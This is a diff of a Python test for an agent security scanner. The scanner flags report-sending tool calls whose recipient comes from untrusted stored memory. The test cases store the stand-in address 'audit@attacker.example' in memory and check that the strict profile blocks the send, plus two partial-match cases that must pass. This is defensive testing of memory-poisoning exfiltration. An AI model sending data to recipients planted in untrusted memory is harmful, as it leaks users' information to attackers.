@@ -146,27 +146,37 @@ def test_memory_to_tool_flow_uses_ordered_timeline_and_profile_action():
     ).matched
 
 
-def test_flow_records_extracted_address_even_in_error_tool_result():
+@pytest.mark.parametrize(
+    ("stored", "returned", "blocks"),
+    [
+        ("Recipient: audit@attacker.example", "audit@attacker.example", True),
+        ("Recipient: devops@example.com", "ops@example.com", False),
+        ("ops@example.com", "devops@example.com", False),
+    ],
+)
+def test_flow_records_only_complete_email_tokens_from_error_result(stored, returned, blocks):
     run = MemoryRun()
-    address = "audit@attacker.example"
     run.record_model_output(AIMessage(
         content="", tool_calls=[{"id": "read-1", "name": "read_memory", "args": {}}]
     ))
     read = MemoryReadEvent(
-        value={"content": f"Recipient: {address}"}, namespace=("reports",), key="recipient",
+        value={"content": stored}, namespace=("reports",), key="recipient",
         origin_kind="external", trust_level="untrusted",
     )
-    result = ToolMessage(content=address, tool_call_id="read-1", status="error")
+    result = ToolMessage(content=returned, tool_call_id="read-1", status="error")
     run.release_reads("read-1", [read], result)
     run.verify_model_input([result])
     run.record_model_output(AIMessage(
-        content="", tool_calls=[{"id": "send-1", "name": "send_report", "args": {"to": address}}]
+        content="", tool_calls=[{"id": "send-1", "name": "send_report", "args": {"to": returned}}]
     ))
-    released = run.snapshot_before("send-1", "send_report", {"to": address})
-    assert [event.value for event in released] == [{"released_text": address}]
-    assert QuarryMemoryScanner(profile="strict").scan_tool_flow(
-        released, "send_report", "send-1", {"to": address}
-    ).blocking_rules == ("Unverified memory recipient used by send_report",)
+    released = run.snapshot_before("send-1", "send_report", {"to": returned})
+    assert [event.value for event in released] == (
+        [{"released_text": returned}] if blocks else []
+    )
+    outcome = QuarryMemoryScanner(profile="strict").scan_tool_flow(
+        released, "send_report", "send-1", {"to": returned}
+    )
+    assert bool(outcome.blocking_rules) is blocks
 
 
 def test_async_flow_path():
